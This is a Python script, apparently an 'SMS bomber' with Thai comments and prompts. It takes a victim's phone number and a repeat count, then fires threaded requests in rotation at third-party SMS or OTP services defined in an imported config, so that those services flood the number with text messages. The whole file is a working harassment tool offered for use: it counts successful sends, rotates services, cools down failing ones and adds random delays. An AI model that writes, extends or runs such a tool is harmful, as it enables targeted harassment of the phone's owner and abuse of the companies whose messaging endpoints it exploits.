# program/SMS-Slow.py
import phonenumbers
import requests
import random
import time
import threading
from API_LIST import API_CONFIG # Import Config

# Lock
file_lock = threading.Lock()
api_lock = threading.Lock()

# สร้างสถานะ API อัตโนมัติจาก API_CONFIG
api_status = {k: {"active": True, "cooldown": 0, "notified": False} for k in API_CONFIG}

def clean_phone_number(phone):
    phone = phone.strip()
    if phone.startswith("+66"): phone = "0" + phone[3:]
    elif phone.startswith("66"): phone = "0" + phone[2:]
    phone = "".join(filter(str.isdigit, phone))
    return phone

def process_phone_with_api(phone, api_key, success_count):
    retry_delay = 300 # ลดเวลา cooldown ลงหน่อย (300วิ = 5นาที)
    current_time = time.time()

    # เช็ค Cooldown
    with api_lock:
        if not api_status[api_key]["active"] and current_time >= api_status[api_key]["cooldown"]:
            api_status[api_key]["active"] = True
            api_status[api_key]["notified"] = False
        
        if not api_status[api_key]["active"]:
            return False, success_count

    cfg = API_CONFIG.get(api_key)
    if not cfg: return False, success_count

    # เตรียมยิง
    url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
    headers = cfg["headers"]()
    data_input = cfg["data"](phone) if cfg["data"] else None

    start_time = time.time()
    try:
        kwargs = {"headers": headers, "timeout": 15}
        if isinstance(data_input, dict):
            kwargs["json"] = data_input
        elif isinstance(data_input, str):
            kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        end_time = time.time()
        
        # ตรวจสอบความสำเร็จ
        if response.status_code in (200, 201) and cfg["success_check"](response.text):
            print(f"ส่ง SMS สำเร็จครั้งที่ {success_count[0] + 1} | เบอร์ {phone} | Time: {end_time - start_time:.2f}s | API: {cfg['name']}")
            success_count[0] += 1
            return True, success_count
            
    except Exception:
        pass

    # ถ้าไม่สำเร็จ หรือ Error
    with api_lock:
        if not api_status[api_key]["notified"]:
            api_status[api_key]["notified"] = True
        api_status[api_key]["active"] = False
        api_status[api_key]["cooldown"] = current_time + retry_delay
    return False, success_count

def worker(phone, api_key, attempt_number, success_count):
    try:
        parsed = phonenumbers.parse(phone, "TH")
        if not (phonenumbers.is_valid_number(parsed)): return
    except: return

    process_phone_with_api(phone, api_key, success_count)

def send_sms_to_number(phone_number, num_attempts):
    cleaned_phone = clean_phone_number(phone_number)
    if not cleaned_phone or len(cleaned_phone) != 10:
        print(f"เบอร์ {phone_number} ไม่ถูกต้อง")
        return

    # รายการ Key ของ API ทั้งหมด
    api_keys = list(API_CONFIG.keys())
    
    threads = []
    success_count = [0]

    for i in range(num_attempts):
        # วนใช้ API ทีละตัว
        api_key = api_keys[i % len(api_keys)]
        
        t = threading.Thread(target=worker, args=(cleaned_phone, api_key, i + 1, success_count))
        threads.append(t)
        t.start()
        time.sleep(random.uniform(0.1, 0.5)) # Delay นิดหน่อย

    for t in threads:
        t.join()

    print(f"จบการทำงาน | ส่งสำเร็จ {success_count[0]} ครั้ง")

if __name__ == "__main__":
    phone = input("กรุณาใส่เบอร์โทรศัพท์: ")
    try:
        num = int(input("จำนวนครั้ง: "))
        send_sms_to_number(phone, num)
    except ValueError:
        print("ตัวเลขเท่านั้น")
